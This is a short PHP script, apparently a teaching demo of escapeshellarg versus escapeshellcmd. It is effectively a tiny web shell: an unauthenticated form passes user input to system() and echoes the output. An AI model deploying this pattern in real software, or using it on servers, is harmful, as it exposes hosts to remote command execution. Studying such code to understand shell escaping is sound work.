<?php

if($_SERVER["REQUEST_METHOD"] === 'POST'){
    //Servidores Windows
    //$cmd = escapeshellcmd($_POST["cmd"]);
    //Servidores Linux
    $cmd = escapeshellarg($_POST["cmd"]);

    var_dump($cmd);

    echo "<pre>";

    $comando = system($cmd, $retorno);

    echo "</pre>";

}

?>

<form method="post">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>